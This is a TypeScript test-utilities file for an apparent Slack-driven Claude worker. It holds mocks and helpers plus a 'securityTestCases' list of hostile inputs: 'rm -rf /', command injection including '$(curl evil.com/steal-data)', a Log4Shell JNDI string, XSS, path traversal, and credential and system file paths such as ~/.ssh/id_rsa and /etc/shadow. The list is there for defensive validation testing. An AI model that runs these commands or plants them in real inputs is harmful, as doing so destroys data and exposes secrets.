#!/usr/bin/env bun

/**
 * Test utilities for worker package
 */

import { jest } from "bun:test";

/**
 * Mock environment variables for testing
 */
export function createMockEnvironment(overrides: Record<string, string> = {}) {
  return {
    SESSION_KEY: "test-session-123",
    USER_ID: "U123456789",
    USERNAME: "testuser",
    CHANNEL_ID: "C123456789",
    THREAD_TS: "1234567890.123456",
    REPOSITORY_URL: "https://github.com/test/repo",
    USER_PROMPT: Buffer.from("Help me debug this code").toString("base64"),
    SLACK_RESPONSE_CHANNEL: "C123456789",
    SLACK_RESPONSE_TS: "1234567890.123456",
    SLACK_BOT_TOKEN: "xoxb-test-token",
    GITHUB_TOKEN: "ghp_test_token",
    WORKSPACE_DIR: "/workspace",
    RECOVERY_MODE: "false",
    CLAUDE_OPTIONS: JSON.stringify({ model: "claude-3-sonnet", temperature: 0.7 }),
    ...overrides,
  };
}

/**
 * Mock Slack client implementation
 */
export const mockSlackClient = {
  chat: {
    postMessage: jest.fn().mockResolvedValue({
      ok: true,
      ts: "1234567890.123456",
      channel: "C123456789",
    }),
    update: jest.fn().mockResolvedValue({
      ok: true,
      ts: "1234567890.123456",
      channel: "C123456789",
    }),
    delete: jest.fn().mockResolvedValue({
      ok: true,
    }),
  },
  conversations: {
    info: jest.fn().mockResolvedValue({
      ok: true,
      channel: {
        id: "C123456789",
        name: "general",
        is_private: false,
      },
    }),
    history: jest.fn().mockResolvedValue({
      ok: true,
      messages: [],
    }),
    replies: jest.fn().mockResolvedValue({
      ok: true,
      messages: [],
    }),
  },
  users: {
    info: jest.fn().mockResolvedValue({
      ok: true,
      user: {
        id: "U123456789",
        name: "testuser",
        real_name: "Test User",
        profile: {
          email: "test@example.com",
        },
      },
    }),
  },
  files: {
    upload: jest.fn().mockResolvedValue({
      ok: true,
      file: {
        id: "F123456789",
        name: "output.txt",
      },
    }),
  },
};

/**
 * Mock workspace setup implementation
 */
export const mockWorkspaceSetup = {
  createWorkspace: jest.fn().mockResolvedValue("/workspace/user-123"),
  cloneRepository: jest.fn().mockResolvedValue("/workspace/user-123/repo"),
  setupEnvironment: jest.fn().mockResolvedValue(undefined),
  validateSetup: jest.fn().mockResolvedValue(true),
  cleanup: jest.fn().mockResolvedValue(undefined),
  getDiskUsage: jest.fn().mockResolvedValue(1024 * 1024), // 1MB
  createSecureDirectory: jest.fn().mockResolvedValue(undefined),
  sanitizeUserInput: jest.fn().mockImplementation((input: string) => 
    input.replace(/[<>"`]/g, "")
  ),
};

/**
 * Mock Claude session runner implementation
 */
export const mockSessionRunner = {
  executePrompt: jest.fn().mockResolvedValue("Claude response"),
  getSessionState: jest.fn().mockResolvedValue({
    sessionKey: "test-session",
    status: "active",
    conversation: [],
  }),
  addProgressCallback: jest.fn(),
  cleanup: jest.fn().mockResolvedValue(undefined),
  persistSession: jest.fn().mockResolvedValue("/gcs/path/session"),
  recoverSession: jest.fn().mockResolvedValue(true),
};

/**
 * Mock file system operations
 */
export const mockFileSystem = {
  mkdir: jest.fn().mockResolvedValue(undefined),
  writeFile: jest.fn().mockResolvedValue(undefined),
  readFile: jest.fn().mockResolvedValue(Buffer.from("mock file content")),
  access: jest.fn().mockResolvedValue(undefined),
  rm: jest.fn().mockResolvedValue(undefined),
  chmod: jest.fn().mockResolvedValue(undefined),
  stat: jest.fn().mockResolvedValue({
    isDirectory: () => true,
    isFile: () => false,
    size: 1024,
  }),
  readdir: jest.fn().mockResolvedValue([]),
  copyFile: jest.fn().mockResolvedValue(undefined),
  symlink: jest.fn().mockResolvedValue(undefined),
};

/**
 * Mock child process for git operations
 */
export const mockChildProcess = {
  spawn: jest.fn().mockReturnValue({
    stdout: {
      on: jest.fn(),
      pipe: jest.fn(),
    },
    stderr: {
      on: jest.fn(),
      pipe: jest.fn(),
    },
    on: jest.fn().mockImplementation((event: string, callback: any) => {
      if (event === "exit") {
        setTimeout(() => callback(0), 10); // Success exit code
      }
    }),
    kill: jest.fn(),
    pid: 12345,
  }),
  exec: jest.fn().mockImplementation((command: string, callback: any) => {
    setTimeout(() => callback(null, "command output", ""), 10);
  }),
};

/**
 * Progress tracking utilities
 */
export class MockProgressTracker {
  private updates: string[] = [];
  private callbacks: ((update: string) => void)[] = [];

  addCallback(callback: (update: string) => void) {
    this.callbacks.push(callback);
  }

  updateProgress(message: string) {
    this.updates.push(message);
    this.callbacks.forEach(callback => callback(message));
  }

  getUpdates(): string[] {
    return [...this.updates];
  }

  getLastUpdate(): string | null {
    return this.updates[this.updates.length - 1] || null;
  }

  clear() {
    this.updates = [];
    this.callbacks = [];
  }
}

/**
 * Test data generators
 */
export const generators = {
  randomSessionKey: () => `session-${Date.now()}-${Math.random().toString(36).substr(2, 8)}`,
  randomUserId: () => `U${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
  randomChannelId: () => `C${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
  randomMessageTs: () => `${Date.now()}.${Math.random().toString().substr(2, 6)}`,
  randomWorkspaceDir: () => `/workspace/${Math.random().toString(36).substr(2, 8)}`,
  randomRepoUrl: (org = "test", repo = "repo") => 
    `https://github.com/${org}/${repo}-${Math.random().toString(36).substr(2, 5)}`,
};

/**
 * Security test cases
 */
export const securityTestCases = {
  maliciousPrompts: [
    "rm -rf /",
    "; cat /etc/passwd",
    "$(curl evil.com/steal-data)",
    "`rm -rf /`",
    "../../../../etc/passwd",
    "<script>alert('xss')</script>",
    "${jndi:ldap://evil.com/exploit}",
  ],
  
  maliciousRepoUrls: [
    "https://evil.com/malicious-repo",
    "ftp://github.com/user/repo",
    "javascript:alert('xss')",
    "file:///etc/passwd",
    "https://github.com/../../../etc/passwd",
  ],
  
  maliciousFilePaths: [
    "../../../etc/passwd",
    "/etc/shadow", 
    "~/.ssh/id_rsa",
    "\\windows\\system32\\config\\sam",
    "/proc/self/environ",
    "/dev/random",
  ],

  oversizedInputs: {
    hugeName: "a".repeat(1000000),
    hugePrompt: "x".repeat(10000000),
    deepNesting: JSON.stringify({ a: { b: { c: { d: { e: "deep" } } } } }),
  },
};

/**
 * Resource monitoring utilities
 */
export class MockResourceMonitor {
  private metrics: Map<string, number[]> = new Map();

  recordMetric(name: string, value: number) {
    if (!this.metrics.has(name)) {
      this.metrics.set(name, []);
    }
    this.metrics.get(name)!.push(value);
  }

  getMetrics(name: string): number[] {
    return this.metrics.get(name) || [];
  }

  getAverageMetric(name: string): number {
    const values = this.getMetrics(name);
    return values.length > 0 ? values.reduce((a, b) => a + b, 0) / values.length : 0;
  }

  clear() {
    this.metrics.clear();
  }

  simulateResourceUsage() {
    this.recordMetric("cpu", Math.random() * 100);
    this.recordMetric("memory", Math.random() * 1024 * 1024 * 1024); // Random GB
    this.recordMetric("disk", Math.random() * 10 * 1024 * 1024 * 1024); // Random 10GB
  }
}

/**
 * Timeout and retry utilities
 */
export const timeoutUtils = {
  withTimeout<T>(promise: Promise<T>, timeoutMs: number): Promise<T> {
    return Promise.race([
      promise,
      new Promise<never>((_, reject) => 
        setTimeout(() => reject(new Error(`Timeout after ${timeoutMs}ms`)), timeoutMs)
      ),
    ]);
  },

  async retry<T>(
    operation: () => Promise<T>,
    maxAttempts: number = 3,
    delayMs: number = 100
  ): Promise<T> {
    let lastError: Error;
    
    for (let i = 0; i < maxAttempts; i++) {
      try {
        return await operation();
      } catch (error) {
        lastError = error as Error;
        if (i < maxAttempts - 1) {
          await new Promise(resolve => setTimeout(resolve, delayMs));
        }
      }
    }
    
    throw lastError!;
  },

  delay: (ms: number) => new Promise(resolve => setTimeout(resolve, ms)),
};

/**
 * Error simulation utilities
 */
export const errorSimulator = {
  networkError: () => new Error("Network timeout"),
  diskFullError: () => new Error("ENOSPC: no space left on device"),
  permissionError: () => new Error("EACCES: permission denied"),
  rateLimitError: () => new Error("Rate limit exceeded"),
  gitError: () => new Error("fatal: repository not found"),
  claudeApiError: () => new Error("Claude API error: model overloaded"),
  slackApiError: () => new Error("Slack API error: channel not found"),
  
  randomError: () => {
    const errors = [
      errorSimulator.networkError(),
      errorSimulator.diskFullError(),
      errorSimulator.permissionError(),
      errorSimulator.rateLimitError(),
    ];
    return errors[Math.floor(Math.random() * errors.length)];
  },
};

/**
 * Test environment setup and teardown
 */
export class TestEnvironment {
  private originalEnv: Record<string, string | undefined> = {};
  private cleanupCallbacks: (() => void)[] = [];

  setup(env: Record<string, string> = {}) {
    // Save original environment
    for (const key of Object.keys(env)) {
      this.originalEnv[key] = process.env[key];
      process.env[key] = env[key];
    }

    // Set default test environment
    const defaultEnv = createMockEnvironment();
    for (const [key, value] of Object.entries(defaultEnv)) {
      if (!process.env[key]) {
        this.originalEnv[key] = process.env[key];
        process.env[key] = value;
      }
    }
  }

  addCleanup(callback: () => void) {
    this.cleanupCallbacks.push(callback);
  }

  teardown() {
    // Restore original environment
    for (const [key, value] of Object.entries(this.originalEnv)) {
      if (value === undefined) {
        delete process.env[key];
      } else {
        process.env[key] = value;
      }
    }

    // Run cleanup callbacks
    this.cleanupCallbacks.forEach(callback => {
      try {
        callback();
      } catch (error) {
        console.warn("Cleanup callback failed:", error);
      }
    });

    // Reset state
    this.originalEnv = {};
    this.cleanupCallbacks = [];
  }
}

/**
 * Logging utilities for tests
 */
export const testLogger = {
  logs: [] as Array<{ level: string; message: string; timestamp: Date }>,
  
  log(level: string, message: string) {
    this.logs.push({ level, message, timestamp: new Date() });
  },
  
  info(message: string) {
    this.log("info", message);
  },
  
  warn(message: string) {
    this.log("warn", message);
  },
  
  error(message: string) {
    this.log("error", message);
  },
  
  getLogs(level?: string): Array<{ level: string; message: string; timestamp: Date }> {
    return level ? this.logs.filter(log => log.level === level) : [...this.logs];
  },
  
  clear() {
    this.logs = [];
  },
  
  expectLog(level: string, messagePattern: string | RegExp) {
    const logs = this.getLogs(level);
    const found = logs.some(log => {
      if (typeof messagePattern === "string") {
        return log.message.includes(messagePattern);
      } else {
        return messagePattern.test(log.message);
      }
    });
    
    if (!found) {
      throw new Error(`Expected ${level} log matching ${messagePattern}, but not found`);
    }
  },
};